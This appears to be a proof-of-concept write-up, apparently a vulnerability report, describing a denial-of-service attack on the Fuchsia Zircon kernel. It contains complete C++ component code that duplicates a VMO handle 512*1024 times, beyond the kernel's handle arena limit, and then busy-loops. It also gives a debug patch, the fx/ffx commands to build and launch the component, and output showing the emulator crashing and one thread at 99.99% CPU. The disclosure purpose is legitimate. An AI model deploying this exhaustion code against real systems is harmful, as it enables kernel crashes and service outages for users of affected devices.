# Dos on Fuchsia

May only take you 1 min.

## Set-up


Replace "/examples/hello_world/cpp/helloworld.cc" with the following code.

// Get a handle by calling  zx_vmo_create, then call zx_handle_duplicate to duplicate the handle. 

// Here I try to duplicate 512\*1024 handles, while the max number of handles is initialized as 256\*1024 in _arena.Init().

    #include  <zircon/syscalls.h>
	#include  <iostream>
	#define  max_num  512*1024
	zx_handle_t  res_handle[max_num];
	int  main() {
		std::cout  <<  "Hello, Worldddddd!\n";
		zx_handle_t  handle1;
		zx_status_t  sys_ret;
		sys_ret = zx_vmo_create(10,0,&handle1);
		if(sys_ret==ZX_ERR_INVALID_ARGS)
		{
			printf("wrong with zx_vmo_create");
		}
		else  if(sys_ret == ZX_ERR_NO_MEMORY)
		{
			printf("wrong no mem");
		}
		else
		{
			printf("syscall success");
		}
		int  i=0;
		while (i < max_num)
		{
			sys_ret = zx_handle_duplicate(handle1,ZX_RIGHT_SAME_RIGHTS,&res_handle[i]);
			if(sys_ret==ZX_ERR_NO_MEMORY)
			{
			// printf("Ddddddddos");
			}
			i++;
		}
		while (1)
		{}
		return  0;
	}
    
   Call printf(...) when handle could not be created.
   
   /zircon/kernel/lib/fbl/include/fbl/gparena.h
   

    void* Alloc(){
	...

		do{
			...
			if(...){
				if(...){
					printf("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDos!!!"); // here!!!
					return nullptr;
				}
			}
		}while (!top_.compare_exchange_strong(top, next_top, ktl::memory_order_relaxed,
					ktl::memory_order_relaxed));
		count_.fetch_add(1, ktl::memory_order_relaxed);
		return  reinterpret_cast<void*>(top);
	}

## Run

Open four terminals. 

Terminal 1

    $ fx set workstation.qemu-x64 --cache --with //example/hello_world
    $ fx build
    $ fx vdl start -N -u FUCHSIA_ROOT/scripts/start-unsecure-internet.sh

Terminal 2

    $ fx serve-updates

Terminal 3

    $ fx log

Terminal 4
	

   ```
$ ffx component run fuchsia-pkg://fuchsia.com/hello-world#meta/hello-world-cpp.cm
```

## Result
Warnning in Terminal 2, on my machine the FEMU will crash.

Terminal 1
```

$ ssh: Could not resolve hostname : Temporary failure in name resolution
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host
kex_exchange_identification: Connection closed by remote host

```

If you set the 'max_num' value to a small value like 10 in hello_world.cc, the FEMU can still work with the hello_world component. It means that it's feasible to  Dos attack the zircon kernel by loading malicious components. 

```
PID      TID        TIME%  CPU STATE NAME
59937    59939      99.99    3   run hello-world-cpp.cm:initial-thread
26905    26907       0.46    0 block ptysvc.cm:initial-thread
36894    37138       0.45    0 block netstack.cmx:pthread_t:0x18720985b18
 6658     7948       0.43    2 block driver_host:composite-device:virtio-net-irq-worker
54060    54062       0.38    2 block /pkg/bin/sshd:initial-thread
77419    77421       0.36    0   run top:initial-thread
36894    37148       0.35    2 block netstack.cmx:pthread_t:0x90d20f1b18
36894    37161       0.27    2 block netstack.cmx:pthread_t:0x1e2b9737b18

```
